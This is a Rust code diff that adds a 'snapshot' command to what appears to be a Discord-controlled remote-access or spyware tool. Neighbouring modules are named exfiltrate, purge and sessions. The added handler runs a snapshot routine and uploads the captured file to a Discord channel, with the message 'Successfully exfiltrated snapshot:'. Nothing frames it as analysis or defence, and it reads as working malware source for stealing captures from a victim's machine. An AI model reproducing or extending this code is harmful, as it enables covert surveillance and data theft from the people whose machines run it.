@@ -21,6 +21,7 @@ pub mod exfiltrate;
 pub mod info;
 pub mod purge;
 pub mod sessions;
+pub mod snapshot;
 
 pub async fn handle_exfiltrate(
     ctx: &Context,
@@ -52,6 +53,56 @@ pub async fn handle_purge(ctx: &Context, command: &ApplicationCommandInteraction
     ephemeral_interaction_create(ctx, command, &content).await?;
     Ok(())
 }
+
+pub async fn handle_snapshot(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), Error> {
+    let content = snapshot::run(&command.data.options).await;
+
+    match content {
+        Ok(content) => {
+            match content {
+               Some(content) => {
+                   command.create_interaction_response(&ctx.http, |response| {
+                       response
+                           .kind(InteractionResponseType::ChannelMessageWithSource)
+                           .interaction_response_data(|message| {
+                               message.content("Successfully exfiltrated snapshot:");
+                               message.add_file(content);
+                               message
+                           })
+                   })
+                       .await?;
+               }
+                None => {
+                    command.create_interaction_response(&ctx.http, |response| {
+                        response
+                            .kind(InteractionResponseType::ChannelMessageWithSource)
+                            .interaction_response_data(|message| {
+                                message.content("There was no file available");
+                                message
+                            })
+                    }).await?;
+                }
+            }
+
+        }
+
+        Err(err) => {
+            command.create_interaction_response(&ctx.http, |response| {
+                response
+                    .kind(InteractionResponseType::ChannelMessageWithSource)
+                    .interaction_response_data(|message| {
+                        message.content(format!("Ran into an error when performing the snapshot: {}", err));
+                        message
+                    })
+            }).await?;
+        }
+
+    }
+
+
+    Ok(())
+}
+
 
 
 pub async fn handle_session(
